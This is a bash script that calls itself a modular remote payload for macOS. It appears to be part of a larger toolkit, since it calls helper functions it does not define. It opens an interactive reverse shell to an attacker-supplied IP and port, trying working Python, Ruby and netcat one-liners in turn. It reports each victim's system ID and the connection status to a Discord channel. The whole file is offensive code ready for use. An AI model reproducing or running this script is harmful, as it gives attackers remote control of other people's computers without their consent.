#!/bin/bash
# ============================================================
# Reverse Shell for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$IP" || -z "$PT" ]]; then
    send_discord "❌ Reverse shell failed on $SYSID - Missing IP or PORT"
    exit 1
fi

send_discord "🔌 **Reverse Shell Initiated**\nTarget: $SYSID (macOS)\nConnecting to: $IP:$PT"

# Method 1: Bash (may not work due to /dev/tcp)
# bash -i >& /dev/tcp/$IP/$PT 0>&1

# Method 2: Python (usually available on macOS)
if command -v python3 &>/dev/null; then
    python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/zsh','-i'])" &
    exit 0
fi

# Method 3: Ruby (available on macOS)
if command -v ruby &>/dev/null; then
    ruby -rsocket -e "f=TCPSocket.open('$IP',$PT).to_i;exec sprintf('/bin/zsh -i <&%d >&%d 2>&%d',f,f,f)" &
    exit 0
fi

# Method 4: Netcat
if command -v nc &>/dev/null; then
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/zsh -i 2>&1 | nc $IP $PT > /tmp/f &
    exit 0
fi

send_discord "❌ No suitable shell method on $SYSID"

